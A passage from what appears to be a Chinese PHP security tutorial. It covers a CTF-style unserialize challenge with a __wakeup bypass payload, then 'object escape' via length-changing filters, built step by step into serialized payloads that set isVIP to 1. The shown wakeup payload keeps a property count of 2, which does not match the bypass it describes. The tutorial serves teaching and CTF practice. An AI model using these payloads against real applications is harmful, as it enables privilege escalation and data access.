<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">    </span><br><span class="line"><span class="comment">//其实你这么写也行~</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p><strong>当成员属性数目大于实际数目时可绕过 wakeup 方法</strong>，其次 private 的 %00 是老生常谈了</p>
<h4 id="0x04对象逃逸"><a class="markdownIt-Anchor" href="#0x04对象逃逸">#</a> 0x04 对象逃逸</h4>
<p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生 PHP 反序列化字符逃逸的漏洞。</p>
<p>对于 PHP 反序列字符逃逸，我们分为以下两种情况进行讨论。</p>
<ul>
<li>过滤后字符变多</li>
<li>过滤后字符变少</li>
</ul>
<h5 id="过滤后字符变多"><a class="markdownIt-Anchor" href="#过滤后字符变多">#</a> 过滤后字符变多</h5>
<p>设我们先定义一个<strong> user</strong> 类，然后里面一共有 3 个成员变量：<strong>username</strong>、<strong>password</strong>、<strong>isVIP</strong>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//可以看到，由于isVIP在构造函数中被赋值为0，因此序列化后的&quot;isVIP&quot;;i:0</span></span><br></pre></td></tr></table></figure>
<p>这个时候我们增加一个函数，用于对<strong> admin</strong> 字符进行替换，将<strong> admin</strong> 替换为<strong> hacker</strong>，替换函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function filter($s)&#123;</span><br><span class="line">    return str_replace(&quot;admin&quot;,&quot;hacker&quot;,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段程序的输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们的 admin 就会被替换为 hacker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤</span><br></pre></td></tr></table></figure>
<p>仔细看，虽然 admin 变为了 hacker，但长度并没有从 5 变成 6，<strong>因此我们可以使用对象逃逸将 isVIP 变为 1</strong></p>
<p>在字符变多的对象逃逸中，我们需要构造我们需要的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;    //length=47</span><br></pre></td></tr></table></figure>
<p>因为我们需要逃逸的字符串长度为<strong> 47</strong>，并且<strong> admin</strong> 每次过滤之后都会变成<strong> hacker</strong>，也就是说每出现一次<strong> admin</strong>，就会多<strong> 1</strong> 个字符。</p>
<p>因此我们需要重复 47 遍 admin，这样他过滤 47 遍，我们的目标 payload 就可以完全覆盖了</p>
<p>因此我们在可控变量处，重复<strong> 47</strong> 遍<strong> admin</strong>，然后加上我们逃逸后的目标子串，可控变量修改如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们利用代码做拼接形成完整的 payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="comment">//上面的第一个&#x27;&#x27;中是我们构造的目标串，第二个&#x27;&#x27;中是马上要被覆盖的串</span></span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
<p>由于<strong>反序列化后，多余的子串会被抛弃</strong>， <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </code> 我们可以直接无视</p>
<p>尝试反序列化验证我们的 isVIP 是否变为了 1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="string">&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_seri_filter_unseri</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_seri_filter</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a_seri_filter_unseri</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//result：</span></span><br><span class="line"><span class="keyword">object</span>(user)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">282</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">  [<span class="string">&quot;isVIP&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么，灵魂拷问，上面的 username 和 password 都是可控参数，那么我能能不能控制 password 字段？</p>
<p>在这个例子中是不可以的，因为我们不能对用户的密码做替换，但是如果这个字段不是 password，是 nickname 这样的会被过滤的，那么我们的 payload 也可以写在 nickname 中</p>
<p>最后，我们总结一下，想要通过过滤后字符串变多来实现对象逃逸，我们需要哪些步骤</p>
<blockquote>
<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>
<p>​	上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>
<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>
<p>​	上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>
<p>3. 分析它的过滤函数，得到每次过滤我们可以逃逸出的字符数量，与我们的 (2) 中 payload 相比，凑够（2）中字符的数量</p>
<p>​	上述例子中，我们从 admin 变为 hacker，每次过滤字符多一个，因此我们要逃逸 47 个字符，我们就需要重复 47 遍 admin</p>
<p>4. 将我们构造的 payload 放到程序中，得到完整的 payload：</p>
<p>​	上述例子中，我们构造的 payload 是：</p>
<p><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code></p>
<p>通过程序：</p>
<p><code>$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;','123456');</code></p>
<p>生成我们最终的 payload：</p>
<p><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></p>
<p>5.unserialize 进行验证</p>
</blockquote>
<h5 id="过滤后字符变少"><a class="markdownIt-Anchor" href="#过滤后字符变少">#</a> 过滤后字符变少</h5>
<p>同样的过滤，这次将 admin 变为 hack</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">result:</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>同样，我们想把 isVIP 变为 1，比较一下<strong>现有子串</strong>和<strong>目标子串</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;	//现有子串</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串</span><br></pre></td></tr></table></figure>
<p>因为过滤的时候，将<strong> 5</strong> 个字符删减为了<strong> 4</strong> 个，所以和上面字符变多的情况相反，随着加入的<strong> admin</strong> 的数量增多，<strong>现有子串</strong>后面会缩进来。</p>
<p>计算一下<strong>目标子串</strong>的长度：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串</span><br><span class="line">//长度为47</span><br></pre></td></tr></table></figure>
<p>再计算一下到<strong>下一个可控变量</strong>的字符串长度：</p>
